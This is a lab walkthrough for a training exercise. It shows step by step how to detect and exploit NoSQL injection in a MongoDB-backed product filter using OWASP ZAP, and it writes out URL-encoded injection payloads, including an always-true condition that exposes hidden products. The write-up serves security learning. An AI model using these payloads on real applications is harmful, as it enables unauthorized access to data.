# Lab: Detecting NoSQL injection [OWASP Zed Attack Proxy]

In ZAP's browser go to the lab and click any category in the product filter. In the __History__ tab pick a request `GET /filter?category=...` and Open it in __Requester__ tab. 

> Choose something with a single-word name. Thank me later. 

Add `'` to the end of the request URL like: `category=Gifts'` and resend the request. Observe, that there is a JavaScript error returned in the response:

```html
<p class=is-warning>Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: unterminated string literal :
functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
&apos; on server 127.0.0.1:27017. The full response is {&quot;ok&quot;: 0.0, &quot;errmsg&quot;: &quot;SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n&quot;, &quot;code&quot;: 139, &quot;codeName&quot;: &quot;JSInterpreterFailure&quot;}</p>
```

This indicates that we can load a legitimate JavaScript payload in the query. Use `category=Gifts'+'` in a URL encoded format. Select `+` in the URL and right-click on it. Select "Encode/Decode/Hash", copy the output under __URL Encode__ and paste it instead of `+` in the request URL. The query should now look like: `?category=Gifts'%2B'`. Click Send. 

Notice that the request was accepted with no errors. This indicates that a form of server-side injection may be occurring. 

Try to inject a boolean condition to change the response. Alternate between a `false` condition: `Gifts' && 0 &&'x` and a `true` condition: `Gifts' && 1 && 'x` to see if there is a difference in response. URL-encoded requests should look like:

```
GET /filter?category=Gifts%27+%26%26+0+%26%26+%27x
```

and

```
GET /filter?category=Gifts%27+%26%26+1+%26%26+%27x
```

respectively. Notice, that with the `true` condition, the response returns the products in the category __Gifts__. Now change the URL's `category` query parameter value to a boolean condition that always evaluates to true:

```
GET /filter?category=Gifts%27%7C%7C1%7C%7C%27
```

Send the request. Observe that the response contains some products you haven't seen before. Right click on the response and select "Open URL in Browser" > "Chrome" to solve the lab.
